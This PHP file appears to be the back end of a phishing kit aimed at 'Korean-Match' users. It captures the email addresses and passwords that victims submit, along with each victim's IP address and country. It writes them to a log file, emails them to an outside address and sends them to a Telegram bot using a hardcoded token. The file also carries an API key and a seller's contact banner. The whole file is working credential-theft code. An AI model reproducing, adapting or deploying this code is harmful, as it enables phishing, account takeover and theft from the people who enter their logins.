<?php
ob_start();
session_start();

$url = json_decode(file_get_contents("http://api.ipinfodb.com/v3/ip-city/?key=2b3d7d0ad1a285279139487ce77f3f58d980eea9546b5ccc5d08f5ee62ce7471&ip=".$_SERVER['REMOTE_ADDR']."&format=json"));
$country=$url->countryName;
$state=$url->regionName;


$your_email = "supremeuc@rambler.ru"; // Your Fucking Email Here bro !! 



if(isset($_POST['email'])&&isset($_POST['password'])){



	$hi="#---------------------------[ FIXSWEB_Korean-Match_logs...Telegram..@fixsx]----------------------------#\r\n";
	$hi.="Email				: {$_POST['email']}\r\n";
	$hi.="Password          : {$_POST['password']}\r\n";
	$hi.="TIME				: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="IP				:  {$_SERVER['REMOTE_ADDR']}\r\n";
	$hi.="#---------------------------[ FIXSWEB_WA.....+447455335919]----------------------------#\r\n";

		$save=fopen("logs.txt","a+");
		fwrite($save,$hi);
		fclose($save);

	$subject="#Korean logs From  [ {$country}]";
	$headers="From: Logs FIXSWEB <fixsweb>  \r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($your_email,$subject,$hi,$headers);
	
	

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}


				$apiToken = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk";
				$Token='sendMessage';
					$wellsbank = array('chat_id' => '1357995456','text' => $hi);			
					$botapi="https://api.telegram.org";
					$key = substr(sha1(mt_rand()),1,25);
					$response = file_get_contents("$botapi/bot$apiToken/$Token?" . http_build_query($wellsbank));


		// 			exit(header("Location: https://www.google.com/"));

				
		// 			echo json_encode($data);

		// }else{
		
		// 	header("HTTP/1.0 404 Not Found");
		// 	exit();
		}
		
		?>

